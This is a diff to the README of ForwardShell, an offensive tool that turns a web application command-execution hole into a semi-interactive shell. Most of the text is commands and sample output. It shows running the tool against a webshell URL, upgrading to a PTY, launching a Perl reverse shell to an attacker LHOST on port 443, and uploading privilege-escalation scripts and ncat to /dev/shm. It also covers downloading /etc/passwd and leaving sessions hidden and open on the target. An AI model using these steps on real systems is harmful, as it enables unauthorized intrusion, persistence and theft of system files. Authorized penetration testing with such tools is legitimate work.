@@ -23,7 +23,7 @@ ForwardShell is a Python tool to exploit a common Web application command execut
 ```
 usage: python3 ForwardShell.py -url <url> [-data <post-data>] [-prefix <prefix>] [-suffix <suffix>] [-P <proxy>]
 
-ForwardShell v0.4.1 - Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell
+ForwardShell v0.4.2 - Exploits a simple Web application RCE on Linux systems and builds a semiautomatic shell
 
 optional arguments:
   -h, --help       show this help message and exit
@@ -89,8 +89,8 @@ Obviously it sounds unneeded to explain verbose output and of course it is. Neve
 ```
 python3 ForwardShell.py -url 'http://www.site.com/shell.php?cmd=<RCE>' -verbose                                                       
   
-[*] ForwardShell v0.4.1:
-[VERBOSE] Add additional header {'User-Agent': 'ForwardShell/0.4.1', 'Content-Type': 'application/x-www-form-urlencoded'}
+[*] ForwardShell v0.4.2:
+[VERBOSE] Add additional header {'User-Agent': 'ForwardShell/0.4.2', 'Content-Type': 'application/x-www-form-urlencoded'}
 [VERBOSE] Using network connection speed fast
 [VERBOSE] Using HTTP method GET
 [VERBOSE] Using a chunk size of 1850 characters when uploading files
@@ -136,20 +136,20 @@ python3 ForwardShell.py -url 'http://www.site.com/shell.php?cmd=<RCE>' -verbose
 [VERBOSE] Generate random session ID: 45440
 [+] Connection to http://www.site.com with ID 45440 established
 [*] Type ? for help
-Shell:>
+Shell@webserver:>
 ```
 # How To Use After Start
 After you have started ForwardShell, it welcomes you with some generic details an a 'Shell' prompt, where you can input your commands (e.g. whoami)
 ```
 python3 ForwardShell.py -url http://www.site.com/shell.php?cmd=<RCE> -prefix '<pre>' -suffix '</pre>' -proxy 'http://127.0.0.1:8080'
 
-[*] ForwardShell v0.4.1:
+[*] ForwardShell v0.4.2:
 [*] Trying to set up ForwardShell on Target http://www.site.com
 [+] Connection to http://www.site.com established
 [*] Type ? for help
-Shell:> whoami
+Shell@webserver:> whoami
 www-data
-Shell:> 
+Shell@webserver:> 
 ```
 
 If you need help to use the included features of ForwardShell, just type ? and hit Enter.
@@ -157,7 +157,7 @@ If you need help to use the included features of ForwardShell, just type ? and h
 Shell:> ?
 [?] ForwardShell - Internal Commands:
 
-  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type
+  ?set                    Change Bind- and ReverseShell parameters, like LHOST, LPORT and Shell type
   ?start                  Start a ForwardShell shell module
   ?start -m {module}      Start a specific shell module; available modules are Upgrade, RevShell and BindShell
   ?resume                 Resumes an existing shell on the target
@@ -174,11 +174,11 @@ Shell:>
 ## Python PTY
 Right now you have a MKFIFO shell, which isn't that bad, but far away from being a PTY. ForwardShell can help you with this and search the target for a Python2 or Python3 installation. If it finds a sufficient one, you can start a PTY upgrade simply by using '?start -m upgrade'. Now you have a PTY and you can interact with your target and certain programs (e.g. sudo, ssh, passwd, etc.) even better.
 ```
-Shell:> ?start -m upgrade
+Shell@webserver:> ?start -m upgrade
 [*] Start PTY with /usr/bin/python
-Just pimping your PTY a little bit...
+Just upgrade your PTY a little bit...
 www-data@webserver:/var/www/html$ 
-Shell:> 
+Shell@webserver:> 
 ```
 ## Bind- and ReverseShell
 Maybe you want to setup a Bind- or ReverseShell, use ?set to configure LHOST, LPORT and Bindshell or Revshell type.
@@ -201,31 +201,31 @@ You can set the above parameter according to your needs, e.g.:
 > ?set Revshell Python
 > ?set BindShell Perl
 
-Shell:>
+Shell@webserver:>
 ```
 Configure the options according your needs and after that you can start the Bind- or ReverseShell simply with '?start -m \<shelltype\>'.
 ```
-Shell:> ?set lhost 192.168.0.1
+Shell@webserver:> ?set lhost 192.168.0.1
 
   [+] LHOST      192.168.0.1
 
-Shell:> ?set lport 443
+Shell@webserver:> ?set lport 443
 
   [+] LPORT      443
 
-Shell:> ?set revshell perl
+Shell@webserver:> ?set revshell perl
 
   [+] Revshell   perl
 
-Shell:> ?start -m revshell     
+Shell@webserver:> ?start -m revshell     
 [*] Starting ReverseShell with perl to 192.168.0.1 on port 443
 
-Shell:> 
+Shell@webserver:> 
 ```
 ## Resume an Orphaned Session
 Imagine you have been setup your PTY, have done some magic voodoo, connected with SSH to another box... and your connection died for whatever reason... DAMN. But as your session is within a MKFIFO process, it is still alive and you can simply re-connect to it by using ?resume and retrieve your orphaned session. 
 ```
-Shell:> ?resume
+Shell@webserver:> ?resume
 Your own current session is: 51760
 These are the current open sessions at http://www.site.com:
 
@@ -235,16 +235,16 @@ These are the current open sessions at http://www.site.com:
 To which session number you want to connect to: 1
 [*] Cleaning up unneeded sessions and files
 [+] Switching to session 54645
-Shell:>
+Shell@webserver:>
 ```
 ## Upload Files
 Likely that you want to upload a file or privesc-script to the target. Just use '?upload \<local-file\>' and the file gets uploaded to the target /dev/shm directory.
 ```
-Shell:> ?upload linpeas.sh
+Shell@webserver:> ?upload linpeas.sh
 [*] Calculating chunks of linpeas.sh...
 [*] Uploading chunk 50 of 50 from linpeas.sh in progress...
 [!] Upload finished
-Shell:> ls -al /dev/shm/
+Shell@webserver:> ls -al /dev/shm/
 ls -al /dev/shm/
 total 336
 drwxrwxrwt  2 root     root        120 Feb 20 23:14 .
@@ -254,11 +254,11 @@ prw-r--r--  1 www-data www-data      0 Feb 20 23:14 Fwdsh-input.54645
 -rw-------  1 postgres postgres  16192 Feb 16 23:22 PostgreSQL.1608135916
 -rw-r--r--  1 www-data www-data 320037 Feb 20 23:14 linpeas.sh
 www-data@webserver:/var/www/html$
-Shell:>
+Shell@webserver:>
 ```
-ForwardShell has been pre-configured with some common privesc-scripts respositories. You can upload LinPEAS, LinEnum and Linux-Exploit-Suggester directly from their github repository without downloading them manually first. ForwardShell downloads the current version und uploads it directly to the target /dev/shm/ directory.
+ForwardShell has been pre-configured with some common privesc-scripts repositories. You can upload LinPEAS, LinEnum and Linux-Exploit-Suggester directly from their github repository without downloading them manually first. ForwardShell downloads the current version und uploads it directly to the target /dev/shm/ directory.
 ```
-Shell:> ?upload
+Shell@webserver:> ?upload
 [?] ForwardShell - File Upload:
 
   ?upload {filename}      Upload a local file to the target /dev/shm directory
@@ -270,11 +270,11 @@ You can upload a file like:          You can upload a module like:
 > ?upload c:\tools\chisel            > ?upload -m exploit-suggester
 > ?upload /usr/bin/ncat              > ?upload -m LinEnum
 
-Shell:> ?upload -m linenum
+Shell@webserver:> ?upload -m linenum
 [*] Calculating chunks of LinEnum.sh...
 [*] Uploading chunk 8 of 8 from LinEnum.sh in progress...
 [!] Upload finished
-Shell:> ls -al /dev/shm
+Shell@webserver:> ls -al /dev/shm
 ls -al /dev/shm
 total 384
 drwxrwxrwt  2 root     root        140 Feb 20 23:20 .
@@ -284,15 +284,15 @@ prw-r--r--  1 www-data www-data      0 Feb 20 23:20 Fwdsh-input.54645
 -rw-r--r--  1 www-data www-data  46631 Feb 20 23:20 LinEnum.sh
 -rw-------  1 postgres postgres  16192 Feb 16 23:22 PostgreSQL.1608135916
 www-data@webserver:/var/www/html$
-Shell:>
+Shell@webserver:>
 ```
 ## Download Files
 If you want to download a file to your local machine, just enter '?download \<file-path\>' and the file gets downloaded to your local working directory.
 ```
-Shell:> ?download /etc/passwd
+Shell@webserver:> ?download /etc/passwd
 [*] Downloading /etc/passwd in progress...
-[*] Saved the file passwd successfuly
-Shell:>
+[*] Saved the file passwd successfully
+Shell@webserver:>
 ```
 ## Exit the Program
 There are three different options to exit ForwardShell. You can of course hit 'CTRL+C' and ForwardShell will exit immediately. Nonetheless, ForwardShell has been setup a MKFIFO process for you and likely you have been setup a Python PTY process. All these open processes are still running on the target and that seems get caught likely by accident.  
@@ -300,13 +300,13 @@ There are three different options to exit ForwardShell. You can of course hit 'C
 * If you had multiple open sessions on the target, just use '?exit -force' and ForwardShell will cleanup every open ForwardShell session.  
 * If you want exit ForwardShell but leave your current session open, just use '?exit -silent' and the current session will be disconnected but stays open on the target. In this case you can simply re-connect to that session with ?resume.
 ```
-Shell:> ?exit
+Shell@webserver:> ?exit
 [*] Cleaning up unneeded sessions and files
 [*] Have a nice day :-)
 ```
 
 ```
-Shell:> ?exit -silent
+Shell@webserver:> ?exit -silent
 [!] ForwardShell will just be disconnected, your session 70617 stays open still
 [*] Please consider command ?resume to get your orphaned session connected again...
 [*] See you again soon :-)
